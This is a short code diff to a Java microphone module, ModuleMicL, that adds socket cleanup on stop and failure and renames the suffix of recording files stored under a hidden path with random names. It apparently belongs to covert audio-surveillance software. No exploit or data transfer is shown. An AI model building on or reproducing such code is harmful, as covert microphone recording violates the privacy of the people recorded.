@@ -41,6 +41,7 @@ public class ModuleMicL extends ModuleMic {
 
 	void specificStop() {
 		stopRecorder();
+		deleteSockets();
 		recorder = null;
 	}
 
@@ -48,6 +49,7 @@ public class ModuleMicL extends ModuleMic {
 
 		if (numFailures > MAX_NUM_OF_FAILURE) {
 			stopRecorder();
+			deleteSockets();
 			recorder = null;
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "numFailures: " + numFailures);//$NON-NLS-1$
@@ -156,7 +158,7 @@ public class ModuleMicL extends ModuleMic {
 
 	private void createSockets() {
 		if (out_file == null) {
-			out_file = new AutoFile(Path.hidden(), Utils.getRandom() + ".a");
+			out_file = new AutoFile(Path.hidden(), Utils.getRandom() + ModuleMic.MIC_SUFFIX);
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (createSocket) new file: " + out_file.getFile());//$NON-NLS-1$
 			}
